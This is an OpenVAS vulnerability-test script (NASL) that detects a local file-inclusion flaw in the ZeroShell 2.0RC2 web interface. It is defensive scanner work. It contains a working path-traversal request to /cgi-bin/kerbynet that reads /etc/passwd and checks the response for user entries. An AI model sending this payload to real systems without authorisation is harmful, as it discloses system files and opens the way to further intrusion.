###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zeroshell_lfi_08_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# ZeroShell 2.0RC2 File Disclosure / Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "An attacker can exploit this vulnerability to view files or execute
arbitrary script code in the context of the web server process. This may aid in
further attacks.
Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103761";

tag_insight = "Input to the 'Object' value in /cgi-bin/kerbynet is not properly sanitized";


tag_affected = "ZeroShell version 2.0RC2 is vulnerable; other versions may also
be affected.";

tag_summary = "ZeroShell is prone to a local file-include vulnerability because it
fails to sufficiently sanitize user-supplied input.";

tag_solution = "Updates are available.";

tag_vuldetect = "Send a GET request which tries to include /etc/passwd and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_name("ZeroShell 2.0RC2 File Disclosure / Command Execution");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122799/ZeroShell-2.0RC2-File-Disclosure-Command-Execution.html");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-14 10:33:56 +0200 (Wed, 14 Aug 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read /etc/passwd");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports(443);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("openvas-https.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = 443;
if(!get_port_state(port))exit(0);

url = "/";
req = http_get(item:url, port:port);
buf = https_req_get(port:port, request:req);

if("<title>ZeroShell" >!< buf || "kerbyne" >!< buf)exit(0);

url = '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=Render&Object=../../../etc/passwd';
req = http_get(item:url, port:port);
buf = https_req_get(port:port, request:req);

if(buf =~ "root:.*:0:[01]") {

  security_hole(port:port);
  exit(0);
}  

exit(99);

   

